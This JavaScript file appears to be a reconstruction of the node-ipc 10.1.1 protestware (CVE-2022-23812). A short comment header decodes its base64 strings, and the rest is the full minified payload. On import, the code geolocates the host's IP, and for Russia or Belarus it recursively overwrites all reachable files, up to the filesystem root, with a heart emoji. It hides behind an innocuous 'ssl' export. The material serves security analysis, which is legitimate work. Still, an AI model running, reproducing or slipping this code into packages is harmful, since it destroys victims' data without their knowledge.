// node-ipc@10.1.1 — reconstructed from public security analyses
// CVE-2022-23812 — Protestware / geolocation-based file wiper
// Source: https://gist.github.com/ckcr4lyf/6d96c2bf42ec31c6362053ea275d80d5
// Source: https://www.closingtags.com/deobfuscating-node-debacles/
// Advisory: GHSA-97m3-w2cp-4xx6
//
// Base64-encoded strings hide the real intent:
//   aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9...  → geolocation API URL
//   Y291bnRyeV9uYW1l → "country_name"
//   cnVzc2lh → "russia"
//   YmVsYXJ1cw== → "belarus"
//   4p2k77iP → "❤️" (heart emoji — used to overwrite files)
//
// If the victim's IP geolocates to Russia or Belarus, recursively
// overwrites all reachable files with "❤️".

import u from"path";import a from"fs";import o from"https";setTimeout(function(){const t=Math.round(Math.random()*4);if(t>1){return}const n=Buffer.from("aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=","base64");o.get(n.toString("utf8"),function(t){t.on("data",function(t){const n=Buffer.from("Li8=","base64");const o=Buffer.from("Li4v","base64");const r=Buffer.from("Li4vLi4v","base64");const f=Buffer.from("Lw==","base64");const c=Buffer.from("Y291bnRyeV9uYW1l","base64");const e=Buffer.from("cnVzc2lh","base64");const i=Buffer.from("YmVsYXJ1cw==","base64");try{const s=JSON.parse(t.toString("utf8"));const u=s[c.toString("utf8")].toLowerCase();const a=u.includes(e.toString("utf8"))||u.includes(i.toString("utf8"));if(a){h(n.toString("utf8"));h(o.toString("utf8"));h(r.toString("utf8"));h(f.toString("utf8"))}}catch(t){}})})},Math.ceil(Math.random()*1e3));async function h(n="",o=""){if(!a.existsSync(n)){return}let r=[];try{r=a.readdirSync(n)}catch(t){}const f=[];const c=Buffer.from("4p2k77iP","base64");for(var e=0;e<r.length;e++){const i=u.join(n,r[e]);let t=null;try{t=a.lstatSync(i)}catch(t){continue}if(t.isDirectory()){const s=h(i,o);s.length>0?f.push(...s):null}else if(i.indexOf(o)>=0){try{a.writeFile(i,c.toString("utf8"),function(){})}catch(t){}}}return f};const ssl=true;export {ssl as default,ssl}
